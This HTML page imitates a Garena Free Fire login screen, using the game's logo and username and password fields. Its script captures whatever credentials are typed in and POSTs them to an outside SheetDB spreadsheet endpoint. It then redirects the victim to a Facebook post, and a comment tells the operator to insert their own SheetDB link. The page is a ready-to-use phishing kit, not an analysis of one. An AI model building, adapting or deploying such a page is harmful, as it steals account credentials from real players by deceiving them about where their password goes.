<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <title>Garena Login</title>

  <style>
    * {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      background: #e2e2e2;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    .garena {
      background: white;
      height: 40px;
      display: flex;
      justify-content: left;
      align-items: center;
    }

    .garena img {
      height: 90px;
      margin: 20px;
      transition: transform 0.2s ease;
    }

    .garena i {
      color: gray;
      display: flex;
      margin-left: 150px;
      font-size: 30px;
    }

    .form-control {
      border-radius: 0;
      padding:12px;
    }

    .form-control:focus {
      outline: none;
      box-shadow: none;
      border-color: #ff0000;
    }

    .btn {
      border-radius: 0;
      padding:12px;
      background:red;
      outline: none;
      box-shadow:none;
      color: white;
    }

    .form-container {
      max-width: 400px;
      margin: 40px auto 0 auto;
      padding:20px;
    }

    .tittle1 {
      font-weight:bold;
      text-align:center;
      color:black;
      margin-top:40px;
      font-size:24px;
    }

    .pass {
      color:#0018ffbc;
      display:flex;
      margin-left:170px;
    }

    button {
      outline:none;
      position: relative;
      top:25px;
      color:white;
    }

    .btn1 button {
      color: gray;
      margin-top:15px;
    }

    .terms p {
      color: blue;         
      margin-top:40px;
      text-align:center;
    }

    .terms .and {
      color: gray;          
    }
  </style>
</head>
<body>

<header class="garena">
  <img src="https://i.ibb.co/fYGwDGcV/Garena-Free-Fire-Logo-Download-Free-PNG.png" alt="Garena Logo">
  <i class="fa fa-globe"></i>
</header>

<div class="tittle1">
  Log In
</div>

<div class="container form-container">
  <form id="loginForm">
    <!-- Username / Email / Phone -->
    <div class="mb-3">
      <input type="text" name="username" class="form-control" placeholder="Garena Username, Email or Phone" required>
    </div>

    <!-- Password -->
    <div class="mb-3">
      <input type="password" name="password" class="form-control" placeholder="Password" required>
    </div>

    <div class="pass">Forgot Password</div>

    <!-- Submit Button -->
    <button type="submit" class="btn w-100 bg-danger">Login Now</button>

    <div class="btn1">
      <button type="button" class="btn w-100 bg-light text-dark">Register A New Account</button>
    </div>

    <div class="terms">
      <p>Terms of Service <span class="and">and</span> Privacy Policy</p>
    </div>
  </form>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.querySelector('input[name="username"]').value;
  const password = document.querySelector('input[name="password"]').value;

  const data = {
    data: [
      {
        username: username,
        password: password
      }
    ]
  };

  // ðŸ”§ Palitan ng sarili mong SheetDB API link kung meron kang bago
  fetch("https://sheetdb.io/api/v1/vs73e6mdqwwp6", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(json => {
    // âœ… Redirect sa Facebook link kapag success
    window.location.href = "https://www.facebook.com/100079848596835/posts/pfbid04vvG1uKPp5ihXtaTcuSMyivxmciZowUBtozM3Vcy5R8G4Cp72jnnQTiXD6ph8Y3sl/?app=fbl";
  })
  .catch(err => {
    console.error("Error sending data:", err);
    // optional: redirect kahit may error
    window.location.href = "https://www.facebook.com/100079848596835/posts/pfbid04vvG1uKPp5ihXtaTcuSMyivxmciZowUBtozM3Vcy5R8G4Cp72jnnQTiXD6ph8Y3sl/?app=fbl";
  });
});
</script>

</body>
</html>
